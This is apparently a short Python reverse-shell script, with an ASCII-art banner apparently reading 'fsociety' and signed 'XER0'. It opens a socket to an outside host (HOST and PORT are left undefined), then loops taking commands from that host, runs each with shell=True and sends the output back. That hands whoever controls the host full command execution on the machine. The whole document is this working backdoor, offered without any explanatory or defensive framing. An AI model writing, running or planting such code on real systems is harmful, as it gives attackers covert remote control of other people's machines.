import socket, subprocess, os
banner = rf"""
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(banner.encode())
while True:
    s.send(f"{os.getcwd()}>".encode())
    cmd = s.recv(1024).decode()
    if cmd.startswith("cd "):
        os.chdir(cmd.strip("cd ").strip("\n"))
        continue
    output = subprocess.run(cmd,shell=True,
                            capture_output=True)
    s.send(output.stdout + output.stderr)